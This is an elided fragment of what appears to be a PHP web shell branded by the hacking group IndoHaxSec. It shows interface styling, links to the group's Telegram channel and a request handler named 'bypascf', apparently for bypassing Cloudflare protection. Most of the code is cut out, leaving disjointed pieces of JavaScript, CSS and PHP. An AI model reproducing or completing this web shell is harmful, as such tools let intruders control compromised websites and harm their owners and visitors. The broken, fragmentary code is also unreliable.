...
.html(filenames.join(","));
		...
		<style>
			...
			body{margin:0;padding:0;font-family:"Kelly Slab";}
			...
			a {font-family:"Quicksand"; color:grey;}
			a:hover{color:lime;}
			.ico {width:25px;}
			.ico2{width:30px;}
			.scrollToTop{
		...
		echo '
		<div class="container">
			<h1 class="text-center"><a href="https://t.me/INDOHAXSEC" style="color:#ffffff;">[ INDOHAXSEX ]</h1>
	...
	*/
	...
	if ($_GET['aksi'] == 'bypascf') {
		...
		echo '</table></div><hr/><a href="https://t.me/INDOHAXSEC" class="text-muted">Copyright 2024 [ IndoHaxSec ]</a></center><br/>';	
